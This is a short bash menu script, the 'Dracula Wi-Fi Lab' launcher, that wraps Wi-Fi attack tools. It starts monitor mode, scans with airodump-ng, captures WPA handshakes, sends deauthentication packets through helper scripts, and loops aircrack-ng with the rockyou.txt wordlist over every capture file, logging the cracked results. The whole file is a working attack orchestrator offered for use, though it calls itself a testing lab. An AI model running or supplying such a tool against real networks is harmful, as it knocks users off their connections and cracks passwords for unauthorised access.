#!/bin/bash

# Dracula Wi-Fi Lab Launcher Script
# Version 1.0 - Created for real-time testing with dashboard logging
# Place this in your Dracula_Labs folder and run with: ./dracula.sh

clear
echo "\033[0;31m"
echo "🦇 Welcome to Dracula's Wi-Fi Lab 🦇"
echo "--------------------------------------"
echo "Select a task:"
echo "1) Start Monitor Mode"
echo "2) Scan Networks"
echo "3) Capture Handshake"
echo "4) Deauth Clients"
echo "5) Crack Captures"
echo "6) View Dashboard"
echo "7) Exit"
echo "--------------------------------------"
echo -n "Choose: "
read choice

case $choice in
  1)
    echo "\n[+] Starting Monitor Mode..."
    sudo ./start-monitor.sh
    ;;

  2)
    echo "\n[+] Scanning networks... Press Ctrl+C to stop."
    sudo airodump-ng wlan0mon
    ;;

  3)
    echo "\n[+] Starting handshake capture..."
    sudo ./capture.sh
    ;;

  4)
    echo "\n[+] Sending deauth packets..."
    sudo ./deauth.sh
    ;;

  5)
    echo "\n[+] Cracking all handshake files using rockyou.txt..."
    for f in *.cap; do
      echo "\n[*] Cracking $f..."
      aircrack-ng -w rockyou.txt "$f" | tee -a cracked-log.txt
    done
    echo "\n[+] Cracking complete. See cracked-log.txt."
    ;;

  6)
    echo "\n[+] Launching Dracula Dashboard..."
    xdg-open dashboard.html
    ;;

  7)
    echo "\nGoodbye, creature of the night."
    exit 0
    ;;

  *)
    echo "Invalid option."
    ;;
esac
